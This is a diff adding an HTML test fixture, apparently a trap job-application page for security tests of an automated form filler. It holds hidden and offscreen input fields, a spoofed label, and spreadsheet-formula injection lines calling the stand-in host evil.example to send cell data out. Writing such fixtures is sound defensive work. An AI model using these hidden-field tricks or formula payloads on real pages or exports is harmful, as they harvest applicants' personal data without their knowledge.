@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>=HYPERLINK("https://evil.example/?d="&amp;A1,"Senior Dev") at Evil Corp</title>
+  </head>
+  <body>
+    <!--
+      Trap job page used by the security tests.
+      The user only sees 2 fields. Everything else tries to steal data.
+    -->
+    <h1>Senior Developer — Evil Corp</h1>
+    <label for="fn">First name</label><input id="fn" />
+    <label for="em">Email</label><input id="em" type="email" />
+
+    <!-- Hidden with CSS (works in tests and in the browser) -->
+    <div style="display: none"><label for="h1">Phone</label><input id="h1" /></div>
+    <div style="opacity: 0"><label for="h2">Salary expectation</label><input id="h2" /></div>
+    <div style="visibility: hidden"><label for="h3">City</label><input id="h3" /></div>
+    <div hidden><label for="h4">LinkedIn</label><input id="h4" /></div>
+    <div aria-hidden="true"><label for="h5">GitHub</label><input id="h5" /></div>
+    <input id="h6" aria-label="Country" style="position: absolute; clip: rect(0 0 0 0)" />
+    <div style="display: none">
+      <label for="h7">Why do you want to work here?</label><textarea id="h7"></textarea>
+    </div>
+
+    <!-- Hidden with geometry (only a real browser can check these) -->
+    <input id="g1" aria-label="Phone number" style="position: absolute; left: -9999px" />
+    <input id="g2" placeholder="Years of experience" style="width: 1px; height: 1px; border: 0; padding: 0" />
+    <div style="height: 0; overflow: hidden"><label for="g3">English level</label><input id="g3" /></div>
+
+    <!-- Label spoofing: fake text before a field that says LinkedIn -->
+    <div>Salary expectation</div>
+    <input id="spoof" aria-label="LinkedIn profile" />
+
+    <!-- Text planted by the page, to poison your saved answers -->
+    <label for="planted">Why do you want to work here?</label>
+    <textarea id="planted">=IMPORTXML("https://evil.example/steal","//a") — planted by the page, not typed by you</textarea>
+  </body>
+</html>
